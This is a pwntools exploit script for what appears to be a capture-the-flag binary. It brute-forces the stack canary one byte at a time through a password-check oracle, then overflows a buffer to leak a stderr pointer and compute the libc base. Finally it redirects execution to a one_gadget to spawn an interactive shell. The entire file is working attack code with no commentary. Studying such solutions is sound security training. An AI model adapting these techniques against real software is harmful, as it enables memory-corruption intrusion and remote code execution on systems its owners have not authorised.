#!/usr/bin/python3
from pwn import *

exe = context.binary = ELF("./chall_patched", checksec=False)
#libc = exe.libc
libc = ELF("./libc.so.6")

warn = lambda x, msg="Test": log.warn(msg + ": " + hex(x)) or x
s = lambda data: sleep(0.1) or p.send(data)
sl = lambda data=b"": sleep(0.1) or p.sendline(data)
sa = lambda msg, data: p.sendafter(msg, data)
sla = lambda msg, data: p.sendlineafter(msg, data)

def conn():
    if args.REMOTE: 
        return remote("127.0.0.1", 49269)
    else: 
        return process()
p = conn()

if args.GDB:
    context.terminal = ['tmux', 'splitw', '-h', '-p', '55']
    gdb.attach(p, gdbscript='''
        b*0x000000000040156C
        c
	''')
#input()

def brute(length):
    password = b""
    for i in range(length):
        for j in range(0xff, 0, -1):
           output = login1(password + bytes([j]) + b'\0')
           if b"successfully" in output:
               password += bytes([j])
               warn(u64(password.ljust(8, b'\0')))
               break
    return u64(password.ljust(8, b'\0'))

def login1(payload):
    sla(b"Your choice: ", b'1')
    sa(b"Enter your password:", payload)
    p.recvline()
    return p.recvline()

def change_pw2(payload):
    sla(b"Your choice: ", b'2')
    sla(b"Enter your input:", payload)

def exit3():
    sla(b"Your choice: ", b'3')

canary = brute(8) & 0xffffffffffffff00
warn(canary, "Canary")

payload = b'\0' + b'A'*55 + p64(canary)
payload += p64(0x404110) #leak stderr
payload += p64(0x00000000004013DF) #menu
change_pw2(payload)
exit3()

stderr = warn(brute(6), "Stderr")
libc.address = warn(stderr - libc.sym['_IO_2_1_stderr_'], "Libc base")

payload = b'\0'*8 + b'A'*40 + p64(0x404400) + p64(canary)
payload += p64(0x404170)
payload += p64(libc.address + 0xebd43)
change_pw2(payload)
exit3()

p.interactive()

#payload += p64(0x0000000000401384) #ret
#payload += p64(0x00000000004011F0)
#payload += p64(0x0000000000401454)
#payload += p64(0x0000000000401328) + b'C'
